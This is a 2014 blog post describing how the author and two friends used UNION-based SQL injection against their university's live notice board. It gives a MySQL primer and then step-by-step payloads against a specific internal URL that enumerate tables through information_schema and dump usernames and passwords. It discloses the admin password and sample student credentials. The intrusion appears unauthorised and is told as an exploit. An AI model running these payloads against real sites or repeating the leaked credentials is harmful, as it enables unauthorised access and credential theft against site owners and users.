---
layout: post
title: How we hacked our university notice board?
date: 2014-07-10 06:44:56.000000000 +05:30
type: post
published: true
status: publish
author: Nagesh Podilapu a.k.a H4rryp0tt3r
assetID: 33ed6b071854135c17600a86a1d8876a
---

It's been nearly 3 months since my last post. Today I thought It will be helpful for the guys who are interested in Cyber Security, If I write about UNION Based SQLi that we did on our university notice board.
A little learning part before we jump on to exploitation.

<pre>
<b># Just selecting 1 2 and 3</b>
mysql> select 1,2,3;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+

<b># database() is a MySQL function to get current database name.</b>
mysql> select database();
+-----------------+
| database()      |
+-----------------+
| UNIONBased_SQLi |
+-----------------+

<b># Just selecting 1,database(),3</b>
mysql> select 1,database(),3;
+---+-----------------+---+
| 1 | database()      | 3 |
+---+-----------------+---+
| 1 | UNIONBased_SQLi | 3 |
+---+-----------------+---+

<b># group_concat() is a MySQL function which concatenates all the rows</b>
mysql> select group_concat(username,"-",password) from users;
+---------------------------------------------------+
| group_concat(username,"-",password)               |
+---------------------------------------------------+
| admin-admin@onb,N090001-rgukt123,N090002-rgukt123 |
+---------------------------------------------------+

<b># Example of a MySQL UNION operator. </b>
mysql> select 1,2,3 UNION select 4,5,6;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
| 4 | 5 | 6 |
+---+---+---+

<b># UNION only works when two select statements have the same no.of columns.</b>
mysql> select 1,2,3 UNION select 5,6;
ERROR: The used SELECT statements have a different number of columns

<b># To nullify the result of LHS select statement I appended a condition 1=0
 which is false. So the results include only RHS select statement results.</b>
mysql> select username from users where sno=1 and 1=0 UNION select 1;
+----------+
| username |
+----------+
| 1        |
+----------+
</pre>

Good, now let's have a glance at why we started this.

After doing brute-force attack on a web page for getting flag in a [CTF][ctf-about-link]{:target="_blank"}, we thought It would give us admin rights If we can do the same attack on our notice board too. But later we realized that we can't just get the admin password by a filthy brute-force attack.

So we explored that website a bit and noticed that there is a page `notice_view.php?id=1` which takes `id` as GET parameter.

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/onb.png" description="notice_view.php page" %}

As we are web developers we came to an estimation that the backend MySQL query might be

{% highlight text %}
select * from tablename where somecolumnname=$_GET["id"];
{% endhighlight %}

Yeah... That one seems compromising and we just gave it a shot with our best injection payload i.e (single quote) into the GET parameter id. Viola!!

{% highlight text %}
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near ''' at line 1
{% endhighlight %}

Yes! This is vulnerable & we can proceed with exploitation. The best part starts now.

Our next step is to find database name that is used for storing passwords. Exciting isn't it? And we used the below payload

{% highlight text %}
1 and 1=0 UNION select 1,2,3,4,5 --
{% endhighlight %}

So the resultant query becomes

{% highlight text %}
select * from sometablename where
somecolumnname=1 and 1=0 UNION select 1,2,3,4,5 --;
{% endhighlight %}

That payload resulted in an error

{% highlight text %}
The used SELECT statements have a different number of columns
{% endhighlight %}

Yeah it worked. To apply union on 2 SQL query's both must have same no.of columns. But here we didn't know the no.of columns, so to find no.of columns we tried imagining from 1 to some number until which we will not get an SQL error. We used below payloads, and 3rd one made it!

{% highlight text %}
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1--
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2--
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,2,3--
{% endhighlight %}

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/injected.png" description="First Injection point" %}

So the backend query which is fetching notices is selecting 3 columns, but the web page is displaying only 2 & 3 (So these columns are vulnerable) and anything we inject in those columns that will display the result of that injected query on web page.

Cool, so now we can inject a code that will print database name on web page. There is a MySQL function `database()` which will display the current selected database. So we can use that function in any of the columns 2 (or) 3.

{% highlight text %}
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION select 1,database(),3--
{% endhighlight %}

And result of this query is..

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/database.png" description="Database name being displayed on page" %}

We have the database name `Notices`, now we have to find the table name for that we will use the mysql default Database which stores information of all the databases in it. So we have to extract all the information related to the database `Notices`. In order to do so we have used this payload

{% highlight text %}
http://10.2.42.242/ONB/notice_view.php?id=1 and
1=0 UNION select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES
where TABLE_SCHEMA='Notices' --
{% endhighlight %}

And the result is

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/tables.png" description="Table names being displayed on page" %}

Now we got all the tables in `Notices` Database and those are `notices, users`. This 'users' table seems interesting and we chose to see the contents of 'users' table first. But before that we should know the columns names of that table, information_schema is our friend now.

{% highlight text %}
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0 UNION
select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where
TABLE_NAME='users' AND TABLE_SCHEMA='Notices'--
{% endhighlight %}

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/columns.png" description="Column names being displayed on page" %}

Now we just need to print password column from that table, used below payload.

{% highlight text %}
http://10.2.42.242/ONB/notice_view.php?id=1 and 1=0
UNION select 1,group_concat(username,"-",password),3 from users --
{% endhighlight %}

Result is...

{% include image.html url="/assets/33ed6b071854135c17600a86a1d8876a/passwords.png" description="Passwords being displayed on page" %}

Ah! Finally, the admin password is on page and it is: `admin@onb`

And in this post I keep on mentioning we. So we are

[Nageswara Rao Podilapu (Me)](https://www.facebook.com/H4rryp0tt3r7){:target="_blank"} <br>
[Anesh Parvatha](https://www.facebook.com/anesh.cse){:target="_blank"} <br>
[Ambati Bharath](https://www.facebook.com/bharath.hussy){:target="_blank"}

[ctf-about-link]: https://ctftime.org/ctf-wtf/
